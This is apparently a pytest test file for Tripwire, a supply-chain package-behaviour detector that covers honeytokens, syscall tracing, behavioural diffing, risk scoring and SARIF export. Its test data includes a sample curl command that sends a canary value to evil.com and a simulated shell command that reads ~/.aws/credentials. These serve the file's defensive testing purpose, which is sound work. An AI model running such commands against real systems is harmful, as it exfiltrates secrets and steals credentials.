"""Comprehensive unit and integration tests for Tripwire."""

import pytest
from tripwire.core.honeytokens import HoneytokenManager
from tripwire.core.tracer import SyscallTracer
from tripwire.core.normalizer import TraceNormalizer
from tripwire.core.diff_engine import BehavioralDiffEngine
from tripwire.core.risk_scorer import RiskScorer
from tripwire.models.report import RiskSeverity
from tripwire.api.sarif_exporter import export_diff_to_sarif


def test_honeytokens_generation_and_detection():
    mgr = HoneytokenManager(seed="test_seed_123")
    assert mgr.canary_id.startswith("TW-")
    assert any("AKIA_TRIPWIRE_CANARY" in c for c in mgr.tracked_canaries)

    # Test sensitive file detection
    trip = mgr.evaluate_file_access("/home/user/.aws/credentials", pid=101, process="node")
    assert trip is not None
    assert trip.token_type == "AWS"
    assert trip.pid == 101

    # Test canary payload leak detection
    sample_leak = f"curl -X POST https://evil.com/exfil?k={mgr.canary_hash}"
    leak_trip = mgr.evaluate_payload_leak(sample_leak, pid=102, process="curl")
    assert leak_trip is not None
    assert leak_trip.token_type == "EXFILTRATION"


def test_tracer_and_normalizer():
    tracer = SyscallTracer()
    
    # Ingest file op
    tracer.parse_line('100 12:00:00.100000 openat(AT_FDCWD, "/tmp/npm-4891-abc/index.js", O_RDONLY) = 3')
    # Ingest shell execution
    tracer.parse_line('101 12:00:00.200000 execve("/bin/sh", ["sh", "-c", "whoami"], 0x7fff) = 0')
    # Ingest network socket
    tracer.parse_line('102 12:00:00.300000 connect(4, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("93.184.216.34")}, 16) = 0')

    assert len(tracer.file_events) == 1
    assert len(tracer.process_events) == 1
    assert len(tracer.network_events) == 1

    normalizer = TraceNormalizer()
    fp = normalizer.canonicalize_trace(tracer, "test-pkg", "1.0.0")

    assert len(fp.file_actions) == 1
    assert "OPEN:<TMP_NPM>/index.js" in fp.file_actions
    assert len(fp.process_commands) == 1
    assert "sh -c whoami" in fp.process_commands[0]
    assert len(fp.network_targets) == 1
    assert "AF_INET:93.184.216.34:443" in fp.network_targets


def test_diff_engine_and_risk_scorer():
    mgr = HoneytokenManager(seed="diff_seed")
    normalizer = TraceNormalizer(honeytokens=mgr)
    diff_engine = BehavioralDiffEngine(honeytokens=mgr)
    scorer = RiskScorer()

    # Create baseline trace (v1.0.0): only normal package read
    tracer_old = SyscallTracer()
    tracer_old.parse_line('100 12:00:00.100000 openat(AT_FDCWD, "/detonation/package.json", O_RDONLY) = 3')
    fp_old = normalizer.canonicalize_trace(tracer_old, "demo-pkg", "1.0.0")

    # Create malicious trace (v1.0.1): normal read + shell execution + honeytoken file access
    tracer_new = SyscallTracer()
    tracer_new.parse_line('200 12:00:01.100000 openat(AT_FDCWD, "/detonation/package.json", O_RDONLY) = 3')
    tracer_new.parse_line('201 12:00:01.200000 execve("/bin/sh", ["sh", "-c", "cat ~/.aws/credentials"], 0x7fff) = 0')
    tracer_new.parse_line('201 12:00:01.250000 openat(AT_FDCWD, "/home/sandbox-runner/.aws/credentials", O_RDONLY) = 4')
    fp_new = normalizer.canonicalize_trace(tracer_new, "demo-pkg", "1.0.1")

    trip = mgr.evaluate_file_access("/home/sandbox-runner/.aws/credentials", pid=201, process="cat")
    trips = [trip] if trip else []

    res = diff_engine.diff(fp_old, fp_new, honeytoken_trips=trips)
    scored = scorer.evaluate(res)

    assert scored.verdict == "BLOCK"
    assert scored.severity == RiskSeverity.CRITICAL
    assert scored.risk_score == 10.0
    assert len(scored.honeytoken_trips) == 1
    assert any("T1552.001" == m.technique_id for m in scored.mitre_mappings)
    assert any("T1059.004" == m.technique_id for m in scored.mitre_mappings)


def test_sarif_export():
    mgr = HoneytokenManager()
    diff_engine = BehavioralDiffEngine(honeytokens=mgr)
    scorer = RiskScorer()

    tracer_old = SyscallTracer()
    fp_old = TraceNormalizer().canonicalize_trace(tracer_old, "sarif-test", "1.0.0")

    tracer_new = SyscallTracer()
    tracer_new.parse_line('100 12:00:00.100000 execve("/bin/sh", ["sh", "-c", "malicious_script"], 0x7fff) = 0')
    fp_new = TraceNormalizer().canonicalize_trace(tracer_new, "sarif-test", "1.0.1")

    res = diff_engine.diff(fp_old, fp_new)
    scored = scorer.evaluate(res)

    sarif = export_diff_to_sarif(scored)
    assert sarif["version"] == "2.1.0"
    assert len(sarif["runs"]) == 1
    assert len(sarif["runs"][0]["results"]) >= 1
